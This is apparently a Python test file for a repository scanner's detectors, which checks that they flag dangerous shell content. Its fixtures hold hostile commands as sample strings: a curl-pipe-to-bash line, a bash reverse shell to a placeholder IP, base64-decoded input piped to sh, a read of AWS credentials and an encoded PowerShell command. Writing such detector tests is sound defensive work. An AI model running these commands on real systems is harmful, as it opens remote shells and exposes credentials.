from agent_repo_preflight.scanner_core.filetree import FileTree, FileEntry
from agent_repo_preflight.scanner_core.detectors.content_patterns import (
    ContentPatternDetector,
    ShellScriptDetector,
)


def _tree(path, content):
    return FileTree("r", [FileEntry(path, content, len(content), False)])


def _ids(facts):
    return {f.data.get("pattern_id") for f in facts if f.type.startswith("content.")}


def test_detects_curl_pipe_bash():
    facts = ContentPatternDetector().detect(_tree("setup.sh", "curl http://x | bash\n"))
    assert "curl_pipe_sh" in _ids(facts)


def test_detects_dev_tcp_and_base64_and_creds():
    src = (
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
        "echo aGk= | base64 -d | sh\n"
        "cat ~/.aws/credentials\n"
    )
    ids = _ids(ContentPatternDetector().detect(_tree("x.sh", src)))
    assert {"dev_tcp", "base64_exec", "cred_path_read"} <= ids


def test_detects_encoded_powershell():
    ids = _ids(
        ContentPatternDetector().detect(_tree("a.ps1", "powershell -enc ZQBjAGgAbwA=\n"))
    )
    assert "encoded_powershell" in ids


def test_shell_script_presence():
    facts = ShellScriptDetector().detect(_tree("install.sh", "echo hi\n"))
    assert any(
        f.type == "shell.script_present" and f.data["kind"] == "install.sh"
        for f in facts
    )
